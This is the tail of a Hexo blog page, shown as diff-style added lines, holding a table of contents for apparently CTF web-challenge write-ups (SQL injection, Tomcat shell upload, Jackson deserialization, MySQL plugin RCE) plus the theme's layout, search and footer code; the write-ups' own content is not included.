class="toc-item toc-level-2"><a class="toc-link" href="#3-RCE"><span class="toc-text">3. RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-ez-sqli"><span class="toc-text">Week1 - ez_sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%88-login%EF%BC%89"><span class="toc-text">1. 登录界面（&#x2F;login）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%88-search%EF%BC%89"><span class="toc-text">2. 搜索界面（&#x2F;search）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-ez-cat"><span class="toc-text">Week1 - ez_cat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Tomcat-%E5%90%8E%E5%8F%B0-jsp-shell-%E4%B8%8A%E4%BC%A0"><span class="toc-text">1. Tomcat 后台 jsp shell 上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-suid-perm-%E4%BD%BF%E7%94%A8-date-%E6%8F%90%E6%9D%83"><span class="toc-text">2. suid perm 使用 date 提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-java-signin"><span class="toc-text">Week1 - java_signin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2-ez-spring"><span class="toc-text">Week2 - ez_spring</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3-ez-cfs"><span class="toc-text">Week3 - ez_cfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ez-cfs-part1"><span class="toc-text">1. ez_cfs_part1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Jackson-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-text">1.1 Jackson 原生反序列化链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">1.2 注意点：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-%E5%88%A0%E9%99%A4-BaseJsonNode-writeReplace"><span class="toc-text">1.2.1 删除 BaseJsonNode.writeReplace</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-%E6%8A%9B%E5%87%BA-AmqpRejectAndDontRequeueException-%E5%BC%82%E5%B8%B8"><span class="toc-text">1.2.2 抛出 AmqpRejectAndDontRequeueException 异常</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E6%B6%88%E6%81%AF%E6%9C%AA%E5%A4%84%E7%90%86%EF%BC%8C%E5%88%A0%E9%99%A4%E9%98%9F%E5%88%97"><span class="toc-text">1.2.3 消息未处理，删除队列</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ez-cfs-part2"><span class="toc-text">2. ez_cfs_part2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%8E%A2%E6%9F%A5%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="toc-text">2.1 探查内网环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%8F%8D%E5%BC%B9-tty"><span class="toc-text">2.2 反弹 tty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E8%BF%9E%E6%8E%A5-MySQL"><span class="toc-text">2.3 连接 MySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-ez-cfs-part3"><span class="toc-text">3. ez_cfs_part3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%81%A2%E5%A4%8D-skip-grant-tables"><span class="toc-text">3.1 恢复 skip-grant-tables</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-MySQL-Plugin-RCE"><span class="toc-text">3.2 MySQL Plugin RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ez-cfs-part4"><span class="toc-text">4. ez_cfs_part4</span></a></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
